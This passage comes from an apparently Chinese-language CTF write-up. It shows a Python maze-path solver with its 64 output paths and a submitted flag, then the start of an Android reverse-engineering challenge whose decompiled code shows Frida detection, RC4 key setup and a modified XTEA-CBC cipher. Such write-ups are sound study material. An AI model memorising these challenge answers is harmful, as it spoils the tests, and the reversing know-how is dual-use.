range(1, len(path)):        dx = path[i][0] - path[i-1][0]        dy = path[i][1] - path[i-1][1]        if dx == -1: dirs += &#39;w&#39;        elif dx == 1: dirs += &#39;s&#39;        elif dy == -1: dirs += &#39;a&#39;        elif dy == 1: dirs += &#39;d&#39;    return dirs# 枚举所有中间点顺序并组合路径min_total_len = Nonematching_paths = []for perm in permutations(mids):    segments = [start] + list(perm) + [end]    segment_paths = []    for i in range(len(segments) - 1):        paths = bfs_all_paths(segments[i], segments[i+1])        if not paths:            break        segment_paths.append(paths)    else:        for combo in product(*segment_paths):            path = [combo[0][0]]            for seg in combo:                path += seg[1:]            if min_total_len is None or len(path) &lt; min_total_len:                matching_paths.clear()                min_total_len = len(path)            if len(path) == min_total_len:                dir_str = coord_to_dirs(path)                if dir_str.endswith(&#39;ssds&#39;):                    matching_paths.append(dir_str)# 输出结果print(f&quot;满足结尾为 &#39;ssds&#39; 的最短路径数量: &#123;len(matching_paths)&#125;&quot;)for i, d in enumerate(matching_paths, 1):    print(f&quot;路径 &#123;i&#125;: &#123;d&#125;&quot;)</code></pre><p>由于X的位置设置不合理，所以一共有64种情况</p><pre><code>路径 1: ssssddssddwwddwwddddddddssssssssddssaaaaaaaaaawwddddwwddwwaaaassaaaaaaaassddssssasasddssssddssddssaassddssaaaaasawddddddddwwddssddwwwwddddddwwaaaaaaaaaawwwwddssddwwddssddwwwwaawwddddwwwwddddddddddwwwwaawwddwwaawwdddaaassddssaassddssssssssaawwaaaaaassssssssssssssssaaaasawdddddddddddwwddssds路径 2: ssssddssddwwddwwddddddddssssssssddssaaaaaaaaaawwddddwwddwwaaaassaaaaaaaassddssssasasddssssddssddssaassddssaaaaasawddddddddwwddssddwwwwddddddwwaaaaaaaaaawwwwddssddwwddssddwwwwaawwddddwwwwddddddddddwwwwaawwddwwaawwdddaaassddssaassddssssssssaawwaaaaaassssssssssssssssaaaasadwddddddddddwwddssds路径 3: ssssddssddwwddwwddddddddssssssssddssaaaaaaaaaawwddddwwddwwaaaassaaaaaaaassddssssasasddssssddssddssaassddssaaaaasawddddddddwwddssddwwwwddddddwwaaaaaaaaaawwwwddssddwwddssddwwwwaawwddddwwwwddddddddddwwwwaawwddwwaawwdddaaassddssaassddssssssssaawwaaaaaassssssssssssssssaaaaaswdddddddddddwwddssds路径 4: ssssddssddwwddwwddddddddssssssssddssaaaaaaaaaawwddddwwddwwaaaassaaaaaaaassddssssasasddssssddssddssaassddssaaaaasawddddddddwwddssddwwwwddddddwwaaaaaaaaaawwwwddssddwwddssddwwwwaawwddddwwwwddddddddddwwwwaawwddwwaawwdddaaassddssaassddssssssssaawwaaaaaassssssssssssssssaaaaasdwddddddddddwwddssds路径 5: ssssddssddwwddwwddddddddssssssssddssaaaaaaaaaawwddddwwddwwaaaassaaaaaaaassddssssasasddssssddssddssaassddssaaaaasadwdddddddwwddssddwwwwddddddwwaaaaaaaaaawwwwddssddwwddssddwwwwaawwddddwwwwddddddddddwwwwaawwddwwaawwdddaaassddssaassddssssssssaawwaaaaaassssssssssssssssaaaasawdddddddddddwwddssds路径 6: ssssddssddwwddwwddddddddssssssssddssaaaaaaaaaawwddddwwddwwaaaassaaaaaaaassddssssasasddssssddssddssaassddssaaaaasadwdddddddwwddssddwwwwddddddwwaaaaaaaaaawwwwddssddwwddssddwwwwaawwddddwwwwddddddddddwwwwaawwddwwaawwdddaaassddssaassddssssssssaawwaaaaaassssssssssssssssaaaasadwddddddddddwwddssds路径 7: ssssddssddwwddwwddddddddssssssssddssaaaaaaaaaawwddddwwddwwaaaassaaaaaaaassddssssasasddssssddssddssaassddssaaaaasadwdddddddwwddssddwwwwddddddwwaaaaaaaaaawwwwddssddwwddssddwwwwaawwddddwwwwddddddddddwwwwaawwddwwaawwdddaaassddssaassddssssssssaawwaaaaaassssssssssssssssaaaaaswdddddddddddwwddssds路径 8: ssssddssddwwddwwddddddddssssssssddssaaaaaaaaaawwddddwwddwwaaaassaaaaaaaassddssssasasddssssddssddssaassddssaaaaasadwdddddddwwddssddwwwwddddddwwaaaaaaaaaawwwwddssddwwddssddwwwwaawwddddwwwwddddddddddwwwwaawwddwwaawwdddaaassddssaassddssssssssaawwaaaaaassssssssssssssssaaaaasdwddddddddddwwddssds路径 9: ssssddssddwwddwwddddddddssssssssddssaaaaaaaaaawwddddwwddwwaaaassaaaaaaaassddssssasasddssssddssddssaassddssaaaaaaswddddddddwwddssddwwwwddddddwwaaaaaaaaaawwwwddssddwwddssddwwwwaawwddddwwwwddddddddddwwwwaawwddwwaawwdddaaassddssaassddssssssssaawwaaaaaassssssssssssssssaaaasawdddddddddddwwddssds路径 10: ssssddssddwwddwwddddddddssssssssddssaaaaaaaaaawwddddwwddwwaaaassaaaaaaaassddssssasasddssssddssddssaassddssaaaaaaswddddddddwwddssddwwwwddddddwwaaaaaaaaaawwwwddssddwwddssddwwwwaawwddddwwwwddddddddddwwwwaawwddwwaawwdddaaassddssaassddssssssssaawwaaaaaassssssssssssssssaaaasadwddddddddddwwddssds路径 11: ssssddssddwwddwwddddddddssssssssddssaaaaaaaaaawwddddwwddwwaaaassaaaaaaaassddssssasasddssssddssddssaassddssaaaaaaswddddddddwwddssddwwwwddddddwwaaaaaaaaaawwwwddssddwwddssddwwwwaawwddddwwwwddddddddddwwwwaawwddwwaawwdddaaassddssaassddssssssssaawwaaaaaassssssssssssssssaaaaaswdddddddddddwwddssds路径 12: ssssddssddwwddwwddddddddssssssssddssaaaaaaaaaawwddddwwddwwaaaassaaaaaaaassddssssasasddssssddssddssaassddssaaaaaaswddddddddwwddssddwwwwddddddwwaaaaaaaaaawwwwddssddwwddssddwwwwaawwddddwwwwddddddddddwwwwaawwddwwaawwdddaaassddssaassddssssssssaawwaaaaaassssssssssssssssaaaaasdwddddddddddwwddssds路径 13: ssssddssddwwddwwddddddddssssssssddssaaaaaaaaaawwddddwwddwwaaaassaaaaaaaassddssssasasddssssddssddssaassddssaaaaaasdwdddddddwwddssddwwwwddddddwwaaaaaaaaaawwwwddssddwwddssddwwwwaawwddddwwwwddddddddddwwwwaawwddwwaawwdddaaassddssaassddssssssssaawwaaaaaassssssssssssssssaaaasawdddddddddddwwddssds路径 14: ssssddssddwwddwwddddddddssssssssddssaaaaaaaaaawwddddwwddwwaaaassaaaaaaaassddssssasasddssssddssddssaassddssaaaaaasdwdddddddwwddssddwwwwddddddwwaaaaaaaaaawwwwddssddwwddssddwwwwaawwddddwwwwddddddddddwwwwaawwddwwaawwdddaaassddssaassddssssssssaawwaaaaaassssssssssssssssaaaasadwddddddddddwwddssds路径 15: ssssddssddwwddwwddddddddssssssssddssaaaaaaaaaawwddddwwddwwaaaassaaaaaaaassddssssasasddssssddssddssaassddssaaaaaasdwdddddddwwddssddwwwwddddddwwaaaaaaaaaawwwwddssddwwddssddwwwwaawwddddwwwwddddddddddwwwwaawwddwwaawwdddaaassddssaassddssssssssaawwaaaaaassssssssssssssssaaaaaswdddddddddddwwddssds路径 16: ssssddssddwwddwwddddddddssssssssddssaaaaaaaaaawwddddwwddwwaaaassaaaaaaaassddssssasasddssssddssddssaassddssaaaaaasdwdddddddwwddssddwwwwddddddwwaaaaaaaaaawwwwddssddwwddssddwwwwaawwddddwwwwddddddddddwwwwaawwddwwaawwdddaaassddssaassddssssssssaawwaaaaaassssssssssssssssaaaaasdwddddddddddwwddssds路径 17: ssssddssddwwddwwddddddddssssssssddssaaaaaaaaaawwddddwwddwwaaaassaaaaaaaassddssssasadsdssssddssddssaassddssaaaaasawddddddddwwddssddwwwwddddddwwaaaaaaaaaawwwwddssddwwddssddwwwwaawwddddwwwwddddddddddwwwwaawwddwwaawwdddaaassddssaassddssssssssaawwaaaaaassssssssssssssssaaaasawdddddddddddwwddssds路径 18: ssssddssddwwddwwddddddddssssssssddssaaaaaaaaaawwddddwwddwwaaaassaaaaaaaassddssssasadsdssssddssddssaassddssaaaaasawddddddddwwddssddwwwwddddddwwaaaaaaaaaawwwwddssddwwddssddwwwwaawwddddwwwwddddddddddwwwwaawwddwwaawwdddaaassddssaassddssssssssaawwaaaaaassssssssssssssssaaaasadwddddddddddwwddssds路径 19: ssssddssddwwddwwddddddddssssssssddssaaaaaaaaaawwddddwwddwwaaaassaaaaaaaassddssssasadsdssssddssddssaassddssaaaaasawddddddddwwddssddwwwwddddddwwaaaaaaaaaawwwwddssddwwddssddwwwwaawwddddwwwwddddddddddwwwwaawwddwwaawwdddaaassddssaassddssssssssaawwaaaaaassssssssssssssssaaaaaswdddddddddddwwddssds路径 20: ssssddssddwwddwwddddddddssssssssddssaaaaaaaaaawwddddwwddwwaaaassaaaaaaaassddssssasadsdssssddssddssaassddssaaaaasawddddddddwwddssddwwwwddddddwwaaaaaaaaaawwwwddssddwwddssddwwwwaawwddddwwwwddddddddddwwwwaawwddwwaawwdddaaassddssaassddssssssssaawwaaaaaassssssssssssssssaaaaasdwddddddddddwwddssds路径 21: ssssddssddwwddwwddddddddssssssssddssaaaaaaaaaawwddddwwddwwaaaassaaaaaaaassddssssasadsdssssddssddssaassddssaaaaasadwdddddddwwddssddwwwwddddddwwaaaaaaaaaawwwwddssddwwddssddwwwwaawwddddwwwwddddddddddwwwwaawwddwwaawwdddaaassddssaassddssssssssaawwaaaaaassssssssssssssssaaaasawdddddddddddwwddssds路径 22: ssssddssddwwddwwddddddddssssssssddssaaaaaaaaaawwddddwwddwwaaaassaaaaaaaassddssssasadsdssssddssddssaassddssaaaaasadwdddddddwwddssddwwwwddddddwwaaaaaaaaaawwwwddssddwwddssddwwwwaawwddddwwwwddddddddddwwwwaawwddwwaawwdddaaassddssaassddssssssssaawwaaaaaassssssssssssssssaaaasadwddddddddddwwddssds路径 23: ssssddssddwwddwwddddddddssssssssddssaaaaaaaaaawwddddwwddwwaaaassaaaaaaaassddssssasadsdssssddssddssaassddssaaaaasadwdddddddwwddssddwwwwddddddwwaaaaaaaaaawwwwddssddwwddssddwwwwaawwddddwwwwddddddddddwwwwaawwddwwaawwdddaaassddssaassddssssssssaawwaaaaaassssssssssssssssaaaaaswdddddddddddwwddssds路径 24: ssssddssddwwddwwddddddddssssssssddssaaaaaaaaaawwddddwwddwwaaaassaaaaaaaassddssssasadsdssssddssddssaassddssaaaaasadwdddddddwwddssddwwwwddddddwwaaaaaaaaaawwwwddssddwwddssddwwwwaawwddddwwwwddddddddddwwwwaawwddwwaawwdddaaassddssaassddssssssssaawwaaaaaassssssssssssssssaaaaasdwddddddddddwwddssds路径 25: ssssddssddwwddwwddddddddssssssssddssaaaaaaaaaawwddddwwddwwaaaassaaaaaaaassddssssasadsdssssddssddssaassddssaaaaaaswddddddddwwddssddwwwwddddddwwaaaaaaaaaawwwwddssddwwddssddwwwwaawwddddwwwwddddddddddwwwwaawwddwwaawwdddaaassddssaassddssssssssaawwaaaaaassssssssssssssssaaaasawdddddddddddwwddssds路径 26: ssssddssddwwddwwddddddddssssssssddssaaaaaaaaaawwddddwwddwwaaaassaaaaaaaassddssssasadsdssssddssddssaassddssaaaaaaswddddddddwwddssddwwwwddddddwwaaaaaaaaaawwwwddssddwwddssddwwwwaawwddddwwwwddddddddddwwwwaawwddwwaawwdddaaassddssaassddssssssssaawwaaaaaassssssssssssssssaaaasadwddddddddddwwddssds路径 27: ssssddssddwwddwwddddddddssssssssddssaaaaaaaaaawwddddwwddwwaaaassaaaaaaaassddssssasadsdssssddssddssaassddssaaaaaaswddddddddwwddssddwwwwddddddwwaaaaaaaaaawwwwddssddwwddssddwwwwaawwddddwwwwddddddddddwwwwaawwddwwaawwdddaaassddssaassddssssssssaawwaaaaaassssssssssssssssaaaaaswdddddddddddwwddssds路径 28: ssssddssddwwddwwddddddddssssssssddssaaaaaaaaaawwddddwwddwwaaaassaaaaaaaassddssssasadsdssssddssddssaassddssaaaaaaswddddddddwwddssddwwwwddddddwwaaaaaaaaaawwwwddssddwwddssddwwwwaawwddddwwwwddddddddddwwwwaawwddwwaawwdddaaassddssaassddssssssssaawwaaaaaassssssssssssssssaaaaasdwddddddddddwwddssds路径 29: ssssddssddwwddwwddddddddssssssssddssaaaaaaaaaawwddddwwddwwaaaassaaaaaaaassddssssasadsdssssddssddssaassddssaaaaaasdwdddddddwwddssddwwwwddddddwwaaaaaaaaaawwwwddssddwwddssddwwwwaawwddddwwwwddddddddddwwwwaawwddwwaawwdddaaassddssaassddssssssssaawwaaaaaassssssssssssssssaaaasawdddddddddddwwddssds路径 30: ssssddssddwwddwwddddddddssssssssddssaaaaaaaaaawwddddwwddwwaaaassaaaaaaaassddssssasadsdssssddssddssaassddssaaaaaasdwdddddddwwddssddwwwwddddddwwaaaaaaaaaawwwwddssddwwddssddwwwwaawwddddwwwwddddddddddwwwwaawwddwwaawwdddaaassddssaassddssssssssaawwaaaaaassssssssssssssssaaaasadwddddddddddwwddssds路径 31: ssssddssddwwddwwddddddddssssssssddssaaaaaaaaaawwddddwwddwwaaaassaaaaaaaassddssssasadsdssssddssddssaassddssaaaaaasdwdddddddwwddssddwwwwddddddwwaaaaaaaaaawwwwddssddwwddssddwwwwaawwddddwwwwddddddddddwwwwaawwddwwaawwdddaaassddssaassddssssssssaawwaaaaaassssssssssssssssaaaaaswdddddddddddwwddssds路径 32: ssssddssddwwddwwddddddddssssssssddssaaaaaaaaaawwddddwwddwwaaaassaaaaaaaassddssssasadsdssssddssddssaassddssaaaaaasdwdddddddwwddssddwwwwddddddwwaaaaaaaaaawwwwddssddwwddssddwwwwaawwddddwwwwddddddddddwwwwaawwddwwaawwdddaaassddssaassddssssssssaawwaaaaaassssssssssssssssaaaaasdwddddddddddwwddssds路径 33: ssssddssddwwddwwddddddddssssssssddssaaaaaaaaaawwddddwwddwwaaaassaaaaaaaassddssssaassddssssddssddssaassddssaaaaasawddddddddwwddssddwwwwddddddwwaaaaaaaaaawwwwddssddwwddssddwwwwaawwddddwwwwddddddddddwwwwaawwddwwaawwdddaaassddssaassddssssssssaawwaaaaaassssssssssssssssaaaasawdddddddddddwwddssds路径 34: ssssddssddwwddwwddddddddssssssssddssaaaaaaaaaawwddddwwddwwaaaassaaaaaaaassddssssaassddssssddssddssaassddssaaaaasawddddddddwwddssddwwwwddddddwwaaaaaaaaaawwwwddssddwwddssddwwwwaawwddddwwwwddddddddddwwwwaawwddwwaawwdddaaassddssaassddssssssssaawwaaaaaassssssssssssssssaaaasadwddddddddddwwddssds路径 35: ssssddssddwwddwwddddddddssssssssddssaaaaaaaaaawwddddwwddwwaaaassaaaaaaaassddssssaassddssssddssddssaassddssaaaaasawddddddddwwddssddwwwwddddddwwaaaaaaaaaawwwwddssddwwddssddwwwwaawwddddwwwwddddddddddwwwwaawwddwwaawwdddaaassddssaassddssssssssaawwaaaaaassssssssssssssssaaaaaswdddddddddddwwddssds路径 36: ssssddssddwwddwwddddddddssssssssddssaaaaaaaaaawwddddwwddwwaaaassaaaaaaaassddssssaassddssssddssddssaassddssaaaaasawddddddddwwddssddwwwwddddddwwaaaaaaaaaawwwwddssddwwddssddwwwwaawwddddwwwwddddddddddwwwwaawwddwwaawwdddaaassddssaassddssssssssaawwaaaaaassssssssssssssssaaaaasdwddddddddddwwddssds路径 37: ssssddssddwwddwwddddddddssssssssddssaaaaaaaaaawwddddwwddwwaaaassaaaaaaaassddssssaassddssssddssddssaassddssaaaaasadwdddddddwwddssddwwwwddddddwwaaaaaaaaaawwwwddssddwwddssddwwwwaawwddddwwwwddddddddddwwwwaawwddwwaawwdddaaassddssaassddssssssssaawwaaaaaassssssssssssssssaaaasawdddddddddddwwddssds路径 38: ssssddssddwwddwwddddddddssssssssddssaaaaaaaaaawwddddwwddwwaaaassaaaaaaaassddssssaassddssssddssddssaassddssaaaaasadwdddddddwwddssddwwwwddddddwwaaaaaaaaaawwwwddssddwwddssddwwwwaawwddddwwwwddddddddddwwwwaawwddwwaawwdddaaassddssaassddssssssssaawwaaaaaassssssssssssssssaaaasadwddddddddddwwddssds路径 39: ssssddssddwwddwwddddddddssssssssddssaaaaaaaaaawwddddwwddwwaaaassaaaaaaaassddssssaassddssssddssddssaassddssaaaaasadwdddddddwwddssddwwwwddddddwwaaaaaaaaaawwwwddssddwwddssddwwwwaawwddddwwwwddddddddddwwwwaawwddwwaawwdddaaassddssaassddssssssssaawwaaaaaassssssssssssssssaaaaaswdddddddddddwwddssds路径 40: ssssddssddwwddwwddddddddssssssssddssaaaaaaaaaawwddddwwddwwaaaassaaaaaaaassddssssaassddssssddssddssaassddssaaaaasadwdddddddwwddssddwwwwddddddwwaaaaaaaaaawwwwddssddwwddssddwwwwaawwddddwwwwddddddddddwwwwaawwddwwaawwdddaaassddssaassddssssssssaawwaaaaaassssssssssssssssaaaaasdwddddddddddwwddssds路径 41: ssssddssddwwddwwddddddddssssssssddssaaaaaaaaaawwddddwwddwwaaaassaaaaaaaassddssssaassddssssddssddssaassddssaaaaaaswddddddddwwddssddwwwwddddddwwaaaaaaaaaawwwwddssddwwddssddwwwwaawwddddwwwwddddddddddwwwwaawwddwwaawwdddaaassddssaassddssssssssaawwaaaaaassssssssssssssssaaaasawdddddddddddwwddssds路径 42: ssssddssddwwddwwddddddddssssssssddssaaaaaaaaaawwddddwwddwwaaaassaaaaaaaassddssssaassddssssddssddssaassddssaaaaaaswddddddddwwddssddwwwwddddddwwaaaaaaaaaawwwwddssddwwddssddwwwwaawwddddwwwwddddddddddwwwwaawwddwwaawwdddaaassddssaassddssssssssaawwaaaaaassssssssssssssssaaaasadwddddddddddwwddssds路径 43: ssssddssddwwddwwddddddddssssssssddssaaaaaaaaaawwddddwwddwwaaaassaaaaaaaassddssssaassddssssddssddssaassddssaaaaaaswddddddddwwddssddwwwwddddddwwaaaaaaaaaawwwwddssddwwddssddwwwwaawwddddwwwwddddddddddwwwwaawwddwwaawwdddaaassddssaassddssssssssaawwaaaaaassssssssssssssssaaaaaswdddddddddddwwddssds路径 44: ssssddssddwwddwwddddddddssssssssddssaaaaaaaaaawwddddwwddwwaaaassaaaaaaaassddssssaassddssssddssddssaassddssaaaaaaswddddddddwwddssddwwwwddddddwwaaaaaaaaaawwwwddssddwwddssddwwwwaawwddddwwwwddddddddddwwwwaawwddwwaawwdddaaassddssaassddssssssssaawwaaaaaassssssssssssssssaaaaasdwddddddddddwwddssds路径 45: ssssddssddwwddwwddddddddssssssssddssaaaaaaaaaawwddddwwddwwaaaassaaaaaaaassddssssaassddssssddssddssaassddssaaaaaasdwdddddddwwddssddwwwwddddddwwaaaaaaaaaawwwwddssddwwddssddwwwwaawwddddwwwwddddddddddwwwwaawwddwwaawwdddaaassddssaassddssssssssaawwaaaaaassssssssssssssssaaaasawdddddddddddwwddssds路径 46: ssssddssddwwddwwddddddddssssssssddssaaaaaaaaaawwddddwwddwwaaaassaaaaaaaassddssssaassddssssddssddssaassddssaaaaaasdwdddddddwwddssddwwwwddddddwwaaaaaaaaaawwwwddssddwwddssddwwwwaawwddddwwwwddddddddddwwwwaawwddwwaawwdddaaassddssaassddssssssssaawwaaaaaassssssssssssssssaaaasadwddddddddddwwddssds路径 47: ssssddssddwwddwwddddddddssssssssddssaaaaaaaaaawwddddwwddwwaaaassaaaaaaaassddssssaassddssssddssddssaassddssaaaaaasdwdddddddwwddssddwwwwddddddwwaaaaaaaaaawwwwddssddwwddssddwwwwaawwddddwwwwddddddddddwwwwaawwddwwaawwdddaaassddssaassddssssssssaawwaaaaaassssssssssssssssaaaaaswdddddddddddwwddssds路径 48: ssssddssddwwddwwddddddddssssssssddssaaaaaaaaaawwddddwwddwwaaaassaaaaaaaassddssssaassddssssddssddssaassddssaaaaaasdwdddddddwwddssddwwwwddddddwwaaaaaaaaaawwwwddssddwwddssddwwwwaawwddddwwwwddddddddddwwwwaawwddwwaawwdddaaassddssaassddssssssssaawwaaaaaassssssssssssssssaaaaasdwddddddddddwwddssds路径 49: ssssddssddwwddwwddddddddssssssssddssaaaaaaaaaawwddddwwddwwaaaassaaaaaaaassddssssaasdsdssssddssddssaassddssaaaaasawddddddddwwddssddwwwwddddddwwaaaaaaaaaawwwwddssddwwddssddwwwwaawwddddwwwwddddddddddwwwwaawwddwwaawwdddaaassddssaassddssssssssaawwaaaaaassssssssssssssssaaaasawdddddddddddwwddssds路径 50: ssssddssddwwddwwddddddddssssssssddssaaaaaaaaaawwddddwwddwwaaaassaaaaaaaassddssssaasdsdssssddssddssaassddssaaaaasawddddddddwwddssddwwwwddddddwwaaaaaaaaaawwwwddssddwwddssddwwwwaawwddddwwwwddddddddddwwwwaawwddwwaawwdddaaassddssaassddssssssssaawwaaaaaassssssssssssssssaaaasadwddddddddddwwddssds路径 51: ssssddssddwwddwwddddddddssssssssddssaaaaaaaaaawwddddwwddwwaaaassaaaaaaaassddssssaasdsdssssddssddssaassddssaaaaasawddddddddwwddssddwwwwddddddwwaaaaaaaaaawwwwddssddwwddssddwwwwaawwddddwwwwddddddddddwwwwaawwddwwaawwdddaaassddssaassddssssssssaawwaaaaaassssssssssssssssaaaaaswdddddddddddwwddssds路径 52: ssssddssddwwddwwddddddddssssssssddssaaaaaaaaaawwddddwwddwwaaaassaaaaaaaassddssssaasdsdssssddssddssaassddssaaaaasawddddddddwwddssddwwwwddddddwwaaaaaaaaaawwwwddssddwwddssddwwwwaawwddddwwwwddddddddddwwwwaawwddwwaawwdddaaassddssaassddssssssssaawwaaaaaassssssssssssssssaaaaasdwddddddddddwwddssds路径 53: ssssddssddwwddwwddddddddssssssssddssaaaaaaaaaawwddddwwddwwaaaassaaaaaaaassddssssaasdsdssssddssddssaassddssaaaaasadwdddddddwwddssddwwwwddddddwwaaaaaaaaaawwwwddssddwwddssddwwwwaawwddddwwwwddddddddddwwwwaawwddwwaawwdddaaassddssaassddssssssssaawwaaaaaassssssssssssssssaaaasawdddddddddddwwddssds路径 54: ssssddssddwwddwwddddddddssssssssddssaaaaaaaaaawwddddwwddwwaaaassaaaaaaaassddssssaasdsdssssddssddssaassddssaaaaasadwdddddddwwddssddwwwwddddddwwaaaaaaaaaawwwwddssddwwddssddwwwwaawwddddwwwwddddddddddwwwwaawwddwwaawwdddaaassddssaassddssssssssaawwaaaaaassssssssssssssssaaaasadwddddddddddwwddssds路径 55: ssssddssddwwddwwddddddddssssssssddssaaaaaaaaaawwddddwwddwwaaaassaaaaaaaassddssssaasdsdssssddssddssaassddssaaaaasadwdddddddwwddssddwwwwddddddwwaaaaaaaaaawwwwddssddwwddssddwwwwaawwddddwwwwddddddddddwwwwaawwddwwaawwdddaaassddssaassddssssssssaawwaaaaaassssssssssssssssaaaaaswdddddddddddwwddssds路径 56: ssssddssddwwddwwddddddddssssssssddssaaaaaaaaaawwddddwwddwwaaaassaaaaaaaassddssssaasdsdssssddssddssaassddssaaaaasadwdddddddwwddssddwwwwddddddwwaaaaaaaaaawwwwddssddwwddssddwwwwaawwddddwwwwddddddddddwwwwaawwddwwaawwdddaaassddssaassddssssssssaawwaaaaaassssssssssssssssaaaaasdwddddddddddwwddssds路径 57: ssssddssddwwddwwddddddddssssssssddssaaaaaaaaaawwddddwwddwwaaaassaaaaaaaassddssssaasdsdssssddssddssaassddssaaaaaaswddddddddwwddssddwwwwddddddwwaaaaaaaaaawwwwddssddwwddssddwwwwaawwddddwwwwddddddddddwwwwaawwddwwaawwdddaaassddssaassddssssssssaawwaaaaaassssssssssssssssaaaasawdddddddddddwwddssds路径 58: ssssddssddwwddwwddddddddssssssssddssaaaaaaaaaawwddddwwddwwaaaassaaaaaaaassddssssaasdsdssssddssddssaassddssaaaaaaswddddddddwwddssddwwwwddddddwwaaaaaaaaaawwwwddssddwwddssddwwwwaawwddddwwwwddddddddddwwwwaawwddwwaawwdddaaassddssaassddssssssssaawwaaaaaassssssssssssssssaaaasadwddddddddddwwddssds路径 59: ssssddssddwwddwwddddddddssssssssddssaaaaaaaaaawwddddwwddwwaaaassaaaaaaaassddssssaasdsdssssddssddssaassddssaaaaaaswddddddddwwddssddwwwwddddddwwaaaaaaaaaawwwwddssddwwddssddwwwwaawwddddwwwwddddddddddwwwwaawwddwwaawwdddaaassddssaassddssssssssaawwaaaaaassssssssssssssssaaaaaswdddddddddddwwddssds路径 60: ssssddssddwwddwwddddddddssssssssddssaaaaaaaaaawwddddwwddwwaaaassaaaaaaaassddssssaasdsdssssddssddssaassddssaaaaaaswddddddddwwddssddwwwwddddddwwaaaaaaaaaawwwwddssddwwddssddwwwwaawwddddwwwwddddddddddwwwwaawwddwwaawwdddaaassddssaassddssssssssaawwaaaaaassssssssssssssssaaaaasdwddddddddddwwddssds路径 61: ssssddssddwwddwwddddddddssssssssddssaaaaaaaaaawwddddwwddwwaaaassaaaaaaaassddssssaasdsdssssddssddssaassddssaaaaaasdwdddddddwwddssddwwwwddddddwwaaaaaaaaaawwwwddssddwwddssddwwwwaawwddddwwwwddddddddddwwwwaawwddwwaawwdddaaassddssaassddssssssssaawwaaaaaassssssssssssssssaaaasawdddddddddddwwddssds路径 62: ssssddssddwwddwwddddddddssssssssddssaaaaaaaaaawwddddwwddwwaaaassaaaaaaaassddssssaasdsdssssddssddssaassddssaaaaaasdwdddddddwwddssddwwwwddddddwwaaaaaaaaaawwwwddssddwwddssddwwwwaawwddddwwwwddddddddddwwwwaawwddwwaawwdddaaassddssaassddssssssssaawwaaaaaassssssssssssssssaaaasadwddddddddddwwddssds路径 63: ssssddssddwwddwwddddddddssssssssddssaaaaaaaaaawwddddwwddwwaaaassaaaaaaaassddssssaasdsdssssddssddssaassddssaaaaaasdwdddddddwwddssddwwwwddddddwwaaaaaaaaaawwwwddssddwwddssddwwwwaawwddddwwwwddddddddddwwwwaawwddwwaawwdddaaassddssaassddssssssssaawwaaaaaassssssssssssssssaaaaaswdddddddddddwwddssds路径 64: ssssddssddwwddwwddddddddssssssssddssaaaaaaaaaawwddddwwddwwaaaassaaaaaaaassddssssaasdsdssssddssddssaassddssaaaaaasdwdddddddwwddssddwwwwddddddwwaaaaaaaaaawwwwddssddwwddssddwwwwaawwddddwwwwddddddddddwwwwaawwddwwaawwdddaaassddssaassddssssssssaawwaaaaaassssssssssssssssaaaaasdwddddddddddwwddssds</code></pre><p><strong>palu{990fd7773f450f1f13bf08a367fe95ea}</strong></p><hr><h3 id="ParlooChecker"><a href="#ParlooChecker" class="headerlink" title="ParlooChecker"></a>ParlooChecker</h3><p>安卓逆向，但其实和安卓没啥关系吧，直接看so，Java层没东西</p><pre><code class="language-c">__int64 __fastcall Java_com_linkhash_parloochecker_MainActivity_onCreat3(__int64 a1, __int64 a2, __int64 a3)&#123;  __int64 v3; // x0  __int64 v4; // x0  char ture_or_false; // [xsp+1Ch] [xbp-F4h]  __int64 v7; // [xsp+48h] [xbp-C8h]  __int64 v8; // [xsp+50h] [xbp-C0h]  __int64 v9; // [xsp+58h] [xbp-B8h]  __int64 v12; // [xsp+88h] [xbp-88h]  _QWORD v13[3]; // [xsp+90h] [xbp-80h] BYREF  _QWORD v14[3]; // [xsp+A8h] [xbp-68h] BYREF  _QWORD v15[3]; // [xsp+C0h] [xbp-50h] BYREF  _BYTE v16[24]; // [xsp+D8h] [xbp-38h] BYREF  _BYTE v17[24]; // [xsp+F0h] [xbp-20h] BYREF  __int64 v18; // [xsp+108h] [xbp-8h]  v18 = *(_ReadStatusReg(ARM64_SYSREG(3, 3, 13, 0, 2)) + 40);  if ( (unk_6F7E1 &amp; 1) == 0 )    sub_253E0();  if ( antidebug() )  &#123;    sub_25828(v17, &amp;byte_6F680, 34uLL);         // Frida Detected! Operation Aborted.    v3 = sub_235D0(v17);    v12 = printffffff(a1, v3);    sub_4C2F8(v17);  &#125;  else  &#123;    sub_2524C();                                // 初始化key和iv    sub_25048();                                // 初始化密文    if ( (byte_6F7E0 &amp; 1) != 0 &amp;&amp; !sub_258D0(obj_) )    &#123;      if ( a3 )      &#123;        v9 = sub_258F8(a1, a3, 0LL);        if ( v9 )        &#123;          sub_23554(v16, v9);          sub_25934(a1, a3, v9);          v8 = sub_237A4(v16);          v7 = sub_2380C(v16);          sub_25970(v15, v8, v7);          sub_24AD4(v15, 8uLL);          encrypto(v15, &amp;unk_6F7B0, &amp;unk_6F7C0, v14);          sub_221CC(v13);          ture_or_false = 0;          if ( !sub_258D0(v14) )            ture_or_false = sub_25A64(v14, obj_);          if ( (ture_or_false &amp; 1) != 0 )            sub_4C4B8(v13, &amp;unk_6F705, 33uLL);  // true          else            sub_4C4B8(v13, &amp;unk_6F726, 29uLL);  // Flag is Incorrect. Try again.          v4 = sub_235D0(v13);          v12 = printffffff(a1, v4);          sub_4C2F8(v13);          sub_248D0(v14);          sub_248D0(v15);          sub_4C2F8(v16);        &#125;        else        &#123;          v12 = printffffff(a1, &amp;unk_6F6E6);        &#125;      &#125;      else      &#123;        v12 = printffffff(a1, &amp;unk_6F6CA);      &#125;    &#125;    else    &#123;      v12 = printffffff(a1, &amp;unk_6F6A2);    &#125;  &#125;  _ReadStatusReg(ARM64_SYSREG(3, 3, 13, 0, 2));  return v12;&#125;</code></pre><p>已经写好注释了，key和iv都来自标准RC4，并且两次RC4是一样的</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250518165259504.png" alt="image-20250518165259504"></p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250518165448552.png" alt="image-20250518165448552"></p><p>第一个黄色的是rc4加密的key，红色的是xtea加密的key的密文，第二个黄色的是iv的密文</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250518165536562.png" alt="image-20250518165536562"></p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250518165543101.png" alt="image-20250518165543101"></p><p>然后xtea是CBC模式的，并且还进行了魔改</p><p><img 